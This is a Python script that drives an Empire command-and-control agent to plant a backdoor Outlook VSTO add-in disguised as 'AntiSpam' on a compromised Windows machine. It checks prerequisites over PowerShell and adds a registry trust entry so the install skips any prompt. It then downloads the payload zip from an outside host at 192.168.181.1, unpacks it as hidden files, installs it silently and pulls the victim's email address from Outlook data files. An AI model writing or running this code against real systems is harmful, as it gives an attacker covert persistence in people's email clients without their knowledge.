"""
Install Outlook VSTO backdoor. 
Backdoor requirements:
1. At least Outlook 2013
2. At least .NET 4 Client
3. Usable VSTOinstaller 
Returns email address when successful
"""
from EmpireAPIWrapper import empireAPI
from empire_settings import EMPIRE_SERVER, EMPIRE_PWD, EMPIRE_USER

def run(API, agent_name, vsto_zip_backdoor_url='http://192.168.181.1:8000/antispam.zip'):
    # check for Outlook version
    findOutlook = """Get-ChildItem 'HKCU:\\SOFTWARE\\Microsoft\\Office'"""
    opts = {'Agent': agent_name, 'command': findOutlook}    
    results = API.agent_run_shell_cmd_with_result(agent_name, opts)
    if(not ("15.0" in results or "16.0" in results)):
        raise ValueError('Need at least Outlook 2013')
    
    # check for .NET 4 client
    findDotNet = """Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -recurse |
                    Get-ItemProperty -name Version,Release -EA 0 |
                    Where { $_.PSChildName -match '^(?!S)\\p{L}'} |
                    Select PSChildName, Version, Release"""
    opts['command'] = findDotNet
    if(" 4." not in API.agent_run_shell_cmd_with_result(agent_name, opts)):
        raise ValueError('No .NET 4 Client Profile, cannot proceed')
    
    # Get VSTO installer path
    opts['command'] = """Get-ChildItem -recurse 'HKLM:\\Software\\Microsoft\\VSTO Runtime Setup' | 
                         Get-ItemProperty | Select InstallerPath"""
    results = API.agent_run_shell_cmd_with_result(agent_name, opts)
    if(".exe" not in results):
        raise ValueError('No VSTOInstaller')
    VSTOinstallerpath = results[results.index("C:"):len(results)]
    
    # Get Local App Data path
    opts['command'] = '$env:LOCALAPPDATA'
    uploadpath = API.agent_run_shell_cmd_with_result(agent_name, opts)
    
    # add registry settings for silent VSTO install
    vsto_reg_add = r"""New-Item 'HKCU:\Software\Microsoft\VSTO\Security\Inclusion\97618ff9-cf79-4ce2-b530-43e570019f67' -Force |
                       New-ItemProperty -Name PublicKey -Value '<RSAKeyValue><Modulus>1uL5d9QfFi4PfJpvvtUHXu6sROwLlO/kMQtYC3z3JpEneqAlyu7Dd+c4akI7xre5X2jMBI5D+hVWxrEiqPBnN8meKW2U59DTLPS6ZTBPYfdGxR65gY8AD8uGjlNfafm3niHL1yivC7zs1rz2W2z+aR7fmB0pNMe45k3uC2UWQo0=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>' |
                       New-ItemProperty -Name Url -Value 'file:///REPLACEME/Apps/antispam/AntiSpam.vsto'"""
    vsto_reg_add = vsto_reg_add.replace('REPLACEME',uploadpath.replace('\\','/'))
    opts['command'] = vsto_reg_add
    results = API.agent_run_shell_cmd_with_result(agent_name, opts)
    if("PSPath" not in results):
        raise ValueError('Fail to add VSTO registry for silent install')

    # download VSTO zip file to LOCALAPPDATA
    outfile = uploadpath + '\\Apps\\antispam.zip'
    opts['command'] = "(New-Object System.Net.WebClient).DownloadFile('{0}', '{1}')".format(vsto_zip_backdoor_url, outfile)
    API.agent_run_shell_cmd_with_result(agent_name, opts)

    # unzip VSTO file; tried ClickOnce deployment over HTTP, refuse to work deal to trust issues
    opts['command'] = "$zipfile = (new-object -com shell.application).NameSpace('{0}')\n \
                    $destination = (new-object -com shell.application).NameSpace('{1}')\n \
                    $destination.CopyHere($zipfile.Items(), 0x14)".format(outfile, outfile.replace('\\antispam.zip',''))
    API.agent_run_shell_cmd_with_result(agent_name, opts) # 0x14 for overwrite & hidden copy
    
    # VSTOinstaller silent install.
    opts['command'] = '& "' + VSTOinstallerpath + '" /s /i "' + uploadpath + '\\Apps\\antispam\\AntiSpam.vsto"'
    API.agent_run_shell_cmd_with_result(agent_name, opts)

    # checks installation is complete
    opts['command'] = r"Get-ChildItem 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall' -recurse | Get-ItemProperty"
    if("AntiSpam" not in API.agent_run_shell_cmd_with_result(agent_name, opts)):
        raise ValueError("VTO installation failed")

    # gets email address from OST file
    opts['command'] = r"Get-ChildItem $env:LocalAppData\Microsoft\Outlook\*.ost | % { $_.Name }"
    results = API.agent_run_shell_cmd_with_result(agent_name, opts)
    results = results.replace(".ost", '')
    if(" -" in results):
        results = results[0:results.index(" -")]
    return results
    

if __name__ == '__main__': # unit test
    API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
    print(run(API, API.agents()['agents'][0]['name']))